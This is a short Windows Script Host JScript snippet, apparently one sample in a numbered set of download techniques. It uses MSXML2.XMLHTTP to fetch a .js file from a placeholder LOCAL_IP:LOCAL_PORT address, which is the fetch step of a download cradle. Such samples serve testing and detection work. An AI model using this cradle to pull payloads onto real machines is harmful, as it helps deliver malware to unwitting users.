var url = "http://LOCAL_IP:LOCAL_PORT/HTTP_06_xmlhttp.js"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);
Object.Send();
